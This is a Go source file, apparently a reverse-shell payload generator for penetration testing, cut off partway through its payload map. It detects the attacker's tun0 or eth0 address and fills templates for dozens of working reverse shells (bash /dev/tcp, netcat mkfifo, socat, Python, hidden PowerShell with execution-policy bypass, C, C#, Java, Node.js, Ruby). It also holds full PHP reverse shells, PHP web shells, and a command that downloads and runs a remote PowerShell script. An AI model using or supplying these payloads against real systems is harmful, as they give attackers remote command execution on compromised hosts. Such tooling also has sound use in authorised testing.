package main

import (
    "encoding/base64"
    "github.com/atotto/clipboard"
    "flag"
    "fmt"
    "net"
    "net/url"
    "sort"
    "strings"
    "os/exec"
    "os"
    "log"
)

func getTun0IP() string {
    iface, err := net.InterfaceByName("tun0")
    if err != nil {
        fmt.Println(colorRed + "[-]" + colorReset + " No IP provided and could not find tun0. Trying eth0")
        iface, err = net.InterfaceByName("eth0")
        if err != nil {
            fmt.Println(colorRed + "[-]" + colorReset + " No IP provided and could not find eth0. Using localhost.")
            return "127.0.0.1"
        }
    }

    addrs, err := iface.Addrs()
    if err != nil || len(addrs) == 0 {
        fmt.Println(colorRed + "[-]" + colorReset + " Could not get addresses for interface. Using localhost.")
        return "127.0.0.1"
    }

    for _, addr := range addrs {
        var ip net.IP
        switch v := addr.(type) {
        case *net.IPNet:
            ip = v.IP
        case *net.IPAddr:
            ip = v.IP
        }

        if ip != nil && ip.To4() != nil { 
            return ip.String()
        }
    }

    return "127.0.0.1"
}

func base64Encode(data string) string {
    return base64.StdEncoding.EncodeToString([]byte(data))
}

func doubleBase64Encode(data string) string {
    return base64Encode(base64Encode(data))
}

func urlEncode(data string) string {
    return url.QueryEscape(data)
}

func listShellsInColumns(shellMap map[string]string) {
    const numColumns = 4
    keys := make([]string, 0, len(shellMap))

    for k := range shellMap {
        keys = append(keys, k)
    }

    sort.Strings(keys)

    for i := 0; i < len(keys); i += numColumns {
        for j := 0; j < numColumns; j++ {
            if i+j < len(keys) {
                fmt.Printf("%-20s", keys[i+j])
            }
        }
        fmt.Println()
    }
}

const (
    colorRed   = "\033[31m"
    colorGreen = "\033[32m"
    colorReset = "\033[0m"
)

func main() {
    shellFormatMap := map[string]string{
        "bash":              "{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",
        "bash_196":          "0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196",
        "bash_read_line":    "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
        "bash_5":            "{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",
        "Bash_udp":          "{shell} -i >& /dev/udp/{ip}/{port} 0>&1",
        "nc_mkfifo":         "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
        "nc_-e":             "nc {ip} {port} -e {shell}",
        "nc.exe_-e":         "nc.exe {ip} {port} -e {shell}",
        "busybox_nc_-e":     "busybox nc {ip} {port} -e {shell}",
        "nc_-c":             "nc -c {shell} {ip} {port}",
        "ncat_-e":           "ncat {ip} {port} -e {shell}",
        "ncat.exe_-e":       "ncat.exe {ip} {port} -e {shell}",
        "ncat_udp":          "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f",
        "curl":              "C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null",
        "rustcat":           "rcat connect -s {shell} {ip} {port}",
        "C":                 "#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){\n    int port = {port};\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;       \n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"{ip}\");\n\n    connect(sockt, (struct sockaddr *) &revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {\"{shell}\", NULL};\n    execve(\"{shell}\", argv, NULL);\n\n    return 0;       \n}",
        "C_windows":         "#include <winsock2.h>\r\n#include <stdio.h>\r\n#pragma comment(lib,\"ws2_32\")\r\n\r\nWSADATA wsaData;\r\nSOCKET Winsock;\r\nstruct sockaddr_in hax; \r\nchar ip_addr[16] = \"{ip}\"; \r\nchar port[6] = \"{port}\";            \r\n\r\nSTARTUPINFO ini_processo;\r\n\r\nPROCESS_INFORMATION processo_info;\r\n\r\nint main()\r\n{\r\n    WSAStartup(MAKEWORD(2, 2), &wsaData);\r\n    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);\r\n\r\n\r\n    struct hostent *host; \r\n    host = gethostbyname(ip_addr);\r\n    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));\r\n\r\n    hax.sin_family = AF_INET;\r\n    hax.sin_port = htons(atoi(port));\r\n    hax.sin_addr.s_addr = inet_addr(ip_addr);\r\n\r\n    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\r\n\r\n    memset(&ini_processo, 0, sizeof(ini_processo));\r\n    ini_processo.cb = sizeof(ini_processo);\r\n    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \r\n    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\r\n\r\n    TCHAR cmd[255] = TEXT(\"cmd.exe\");\r\n\r\n    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\r\n\r\n    return 0;\r\n}",
        "C#_tcp_client":     "using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\n\nnamespace ConnectBack\n{\n\tpublic class Program\n\t{\n\t\tstatic StreamWriter streamWriter;\n\n\t\tpublic static void Main(string[] args)\n\t\t{\n\t\t\tusing(TcpClient client = new TcpClient(\"{ip}\", {port}))\n\t\t\t{\n\t\t\t\tusing(Stream stream = client.GetStream())\n\t\t\t\t{\n\t\t\t\t\tusing(StreamReader rdr = new StreamReader(stream))\n\t\t\t\t\t{\n\t\t\t\t\t\tstreamWriter = new StreamWriter(stream);\n\t\t\t\t\t\t\n\t\t\t\t\t\tStringBuilder strInput = new StringBuilder();\n\n\t\t\t\t\t\tProcess p = new Process();\n\t\t\t\t\t\tp.StartInfo.FileName = \"{shell}\";\n\t\t\t\t\t\tp.StartInfo.CreateNoWindow = true;\n\t\t\t\t\t\tp.StartInfo.UseShellExecute = false;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardOutput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardInput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardError = true;\n\t\t\t\t\t\tp.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n\t\t\t\t\t\tp.Start();\n\t\t\t\t\t\tp.BeginOutputReadLine();\n\n\t\t\t\t\t\twhile(true)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tstrInput.Append(rdr.ReadLine());\n\t\t\t\t\t\t\t//strInput.Append(\"\\n\");\n\t\t\t\t\t\t\tp.StandardInput.WriteLine(strInput);\n\t\t\t\t\t\t\tstrInput.Remove(0, strInput.Length);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tprivate static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n        {\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data))\n            {\n                try\n                {\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }\n                catch (Exception err) { }\n            }\n        }\n\n\t}\n}",
        "C#_bash_-i":        "using System;\nusing System.Diagnostics;\n\nnamespace BackConnect {\n  class ReverseBash {\n\tpublic static void Main(string[] args) {\n\t  Process proc = new System.Diagnostics.Process();\n\t  proc.StartInfo.FileName = \"{shell}\";\n\t  proc.StartInfo.Arguments = \"-c \\\"{shell} -i >& /dev/tcp/{ip}/{port} 0>&1\\\"\";\n\t  proc.StartInfo.UseShellExecute = false;\n\t  proc.StartInfo.RedirectStandardOutput = true;\n\t  proc.Start();\n\n\t  while (!proc.StandardOutput.EndOfStream) {\n\t\tConsole.WriteLine(proc.StandardOutput.ReadLine());\n\t  }\n\t}\n  }\n}\n",
        "haskell":           "module Main where\n\nimport System.Process\n\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc {ip} {port} >/tmp/f\"",
        "perl":              "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'",
        "perl_nosh":         "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
        "php_ptm":           "<?php\n// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '{ip}';\n$port = {port};\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; {shell} -i';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists('pcntl_fork')) {\n\t$pid = pcntl_fork();\n\t\n\tif ($pid == -1) {\n\t\tprintit(\"ERROR: Can't fork\");\n\t\texit(1);\n\t}\n\t\n\tif ($pid) {\n\t\texit(0);  // Parent exits\n\t}\n\tif (posix_setsid() == -1) {\n\t\tprintit(\"Error: Can't setsid()\");\n\t\texit(1);\n\t}\n\n\t$daemon = 1;\n} else {\n\tprintit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\nchdir(\"/\");\n\numask(0);\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n\tprintit(\"$errstr ($errno)\");\n\texit(1);\n}\n\n$descriptorspec = array(\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n\tprintit(\"ERROR: Can't spawn shell\");\n\texit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n\tif (feof($sock)) {\n\t\tprintit(\"ERROR: Shell connection terminated\");\n\t\tbreak;\n\t}\n\n\tif (feof($pipes[1])) {\n\t\tprintit(\"ERROR: Shell process terminated\");\n\t\tbreak;\n\t}\n\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit(\"SOCK READ\");\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit(\"SOCK: $input\");\n\t\tfwrite($pipes[0], $input);\n\t}\n\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit(\"STDOUT READ\");\n\t\t$input = fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit(\"STDOUT: $input\");\n\t\tfwrite($sock, $input);\n\t}\n\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit(\"STDERR READ\");\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit(\"STDERR: $input\");\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint \"$string\\n\";\n\t}\n}\n\n?>",
        "php_ivan_sincek":   "<?php\n// Copyright (c) 2020 Ivan Sincek\n// v2.3\n// Requires PHP v5.0.0 or greater.\n// Works on Linux OS, macOS, and Windows OS.\n// See the original script at https://github.com/pentestmonkey/php-reverse-shell.\nclass Shell {\n    private $addr  = null;\n    private $port  = null;\n    private $os    = null;\n    private $shell = null;\n    private $descriptorspec = array(\n        0 => array('pipe', 'r'), // shell can read from STDIN\n        1 => array('pipe', 'w'), // shell can write to STDOUT\n        2 => array('pipe', 'w')  // shell can write to STDERR\n    );\n    private $buffer  = 1024;    // read/write buffer size\n    private $clen    = 0;       // command length\n    private $error   = false;   // stream read/write error\n    public function __construct($addr, $port) {\n        $this->addr = $addr;\n        $this->port = $port;\n    }\n    private function detect() {\n        $detected = true;\n        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS\n            $this->os    = 'LINUX';\n            $this->shell = '{shell}';\n        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {\n            $this->os    = 'WINDOWS';\n            $this->shell = 'cmd.exe';\n        } else {\n            $detected = false;\n            echo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";\n        }\n        return $detected;\n    }\n    private function daemonize() {\n        $exit = false;\n        if (!function_exists('pcntl_fork')) {\n            echo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";\n        } else if (($pid = @pcntl_fork()) < 0) {\n            echo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";\n        } else if ($pid > 0) {\n            $exit = true;\n            echo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";\n        } else if (posix_setsid() < 0) {\n            // once daemonized you will actually no longer see the script's dump\n            echo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";\n        } else {\n            echo \"DAEMONIZE: Completed successfully!\\n\";\n        }\n        return $exit;\n    }\n    private function settings() {\n        @error_reporting(0);\n        @set_time_limit(0); // do not impose the script execution time limit\n        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories\n    }\n    private function dump($data) {\n        $data = str_replace('<', '&lt;', $data);\n        $data = str_replace('>', '&gt;', $data);\n        echo $data;\n    }\n    private function read($stream, $name, $buffer) {\n        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream\n            $this->error = true;                            // set global error flag\n            echo \"STRM_ERROR: Cannot read from ${name}, script will now exit...\\n\";\n        }\n        return $data;\n    }\n    private function write($stream, $name, $data) {\n        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream\n            $this->error = true;                            // set global error flag\n            echo \"STRM_ERROR: Cannot write to ${name}, script will now exit...\\n\";\n        }\n        return $bytes;\n    }\n    // read/write method for non-blocking streams\n    private function rw($input, $output, $iname, $oname) {\n        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {\n            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length\n            $this->dump($data); // script's dump\n        }\n    }\n    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)\n    // we must read the exact byte length from a stream and not a single byte more\n    private function brw($input, $output, $iname, $oname) {\n        $fstat = fstat($input);\n        $size = $fstat['size'];\n        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {\n            // for some reason Windows OS pipes STDIN into STDOUT\n            // we do not like that\n            // we need to discard the data from the stream\n            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {\n                $this->clen -= $bytes;\n                $size -= $bytes;\n            }\n        }\n        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {\n            $size -= $bytes;\n            $this->dump($data); // script's dump\n        }\n    }\n    public function run() {\n        if ($this->detect() && !$this->daemonize()) {\n            $this->settings();\n\n            // ----- SOCKET BEGIN -----\n            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);\n            if (!$socket) {\n                echo \"SOC_ERROR: {$errno}: {$errstr}\\n\";\n            } else {\n                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS\n\n                // ----- SHELL BEGIN -----\n                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);\n                if (!$process) {\n                    echo \"PROC_ERROR: Cannot start the shell\\n\";\n                } else {\n                    foreach ($pipes as $pipe) {\n                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS\n                    }\n\n                    // ----- WORK BEGIN -----\n                    $status = proc_get_status($process);\n                    @fwrite($socket, \"SOCKET: Shell has connected! PID: \" . $status['pid'] . \"\\n\");\n                    do {\n\t\t\t\t\t\t$status = proc_get_status($process);\n                        if (feof($socket)) { // check for end-of-file on SOCKET\n                            echo \"SOC_ERROR: Shell connection has been terminated\\n\"; break;\n                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running\n                            echo \"PROC_ERROR: Shell process has been terminated\\n\";   break; // feof() does not work with blocking streams\n                        }                                                                    // use proc_get_status() instead\n                        $streams = array(\n                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR\n                            'write'  => null,\n                            'except' => null\n                        );\n                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS\n                        if ($num_changed_streams === false) {\n                            echo \"STRM_ERROR: stream_select() failed\\n\"; break;\n                        } else if ($num_changed_streams > 0) {\n                            if ($this->os === 'LINUX') {\n                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN\n                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET\n                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET\n                            } else if ($this->os === 'WINDOWS') {\n                                // order is important\n                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN\n                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET\n                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET\n                            }\n                        }\n                    } while (!$this->error);\n                    // ------ WORK END ------\n\n                    foreach ($pipes as $pipe) {\n                        fclose($pipe);\n                    }\n                    proc_close($process);\n                }\n                // ------ SHELL END ------\n\n                fclose($socket);\n            }\n            // ------ SOCKET END ------\n\n        }\n    }\n}\necho '<pre>';\n// change the host address and/or port number as necessary\n$sh = new Shell('{ip}', {port});\n$sh->run();\nunset($sh);\n// garbage collector requires PHP v5.3.0 or greater\n// @gc_collect_cycles();\necho '</pre>';\n?>",
        "php_cmd":           "<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n</form>\n<pre>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd']);\n    }\n?>\n</pre>\n</body>\n<script>document.getElementById(\"cmd\").focus();</script>\n</html>",
        "php_cmd2":          "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>",
        "php_cmd_small":     "<?=`$_GET[0]`?>",
        "php_exec":          "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} <&3 >&3 2>&3\");'",
        "php_shell_exec":    "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"{shell} <&3 >&3 2>&3\");'",
        "php_system":        "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} <&3 >&3 2>&3\");'",
        "php_passthru":      "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"{shell} <&3 >&3 2>&3\");'",
        "php_`":             "php -r '$sock=fsockopen(\"{ip}\",{port});`{shell} <&3 >&3 2>&3`;'",
        "php_popen":         "php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"{shell} <&3 >&3 2>&3\", \"r\");'",
        "php_proc_open":     "php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"{shell}\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
        "windows_contty":    "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}",
        "powershell1":       "$LHOST = \"{ip}\"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()",
        "powershell2":       "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
        "powershell3":       "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"",
        "powershell4_tls":   "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()",
        "python_1":          "export RHOST=\"{ip}\";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
        "python_2":          "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
        "python3_1":         "export RHOST=\"{ip}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
        "python3_2":         "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
        "python3_windows":   "import os,socket,subprocess,threading;\ndef s2p(s, p):\n    while True:\n        data = s.recv(1024)\n        if len(data) > 0:\n            p.stdin.write(data)\n            p.stdin.flush()\n\ndef p2s(s, p):\n    while True:\n        s.send(p.stdout.read(1))\n\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"{ip}\",{port}))\n\np=subprocess.Popen([\"{shell}\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\n\ns2p_thread = threading.Thread(target=s2p, args=[s, p])\ns2p_thread.daemon = True\ns2p_thread.start()\n\np2s_thread = threading.Thread(target=p2s, args=[s, p])\np2s_thread.daemon = True\np2s_thread.start()\n\ntry:\n    p.wait()\nexcept KeyboardInterrupt:\n    s.close()",    	    
        "python3_short":     "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{shell}\")'",
        "ruby1":             "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'",
        "ruby_nosh":         "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'",
        "socat1":            "socat TCP:{ip}:{port} EXEC:{shell}",
        "socat2tty":         "socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane",
        "sqlite3_nc_mkfifo": "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'",
        "node.js":           "require('child_process').exec('nc -e {shell} {ip} {port}')",
        "node.js2":          "(function(){\r\n    var net = require(\"net\"),\r\n        cp = require(\"child_process\"),\r\n        sh = cp.spawn(\"{shell}\", []);\r\n    var client = new net.Socket();\r\n    client.connect({port}, \"{ip}\", function(){\r\n        client.pipe(sh.stdin);\r\n        sh.stdout.pipe(client);\r\n        sh.stderr.pipe(client);\r\n    });\r\n    return /a/; // Prevents the Node.js application from crashing\r\n})();",
        "java1":             "public class shell {\n    public static void main(String[] args) {\n        Process p;\n        try {\n            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1\");\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
        "java2":             "public class shell {\n    public static void main(String[] args) {\n        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/{ip}/{port} 0>&1\")\n            .redirectErrorStream(true);\n        try {\n            Process p = pb.start();\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
        "java3":             "import java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class shell {\n    public static void main(String[] args) {\n        String host = \"{ip}\";\n        int port = {port};\n        String cmd = \"{shell}\";\n        try {\n            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n            Socket s = new Socket(host, port);\n            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n            while (!s.isClosed()) {\n                while (pi.available() > 0)\n                    so.write(pi.read());\n                while (pe.available() > 0)\n                    so.write(pe.read());\n                while (si.available() > 0)\n                    po.write(si.read());\n                so.flush();\n                po.flush();\n                Thread.sleep(50);\n                try {\n                    p.exitValue();\n                    break;\n                } catch (Exception e) {}\n            }\n            p.destroy();\n            s.close();\n        } catch (Exception e) {}\n    }\n}",
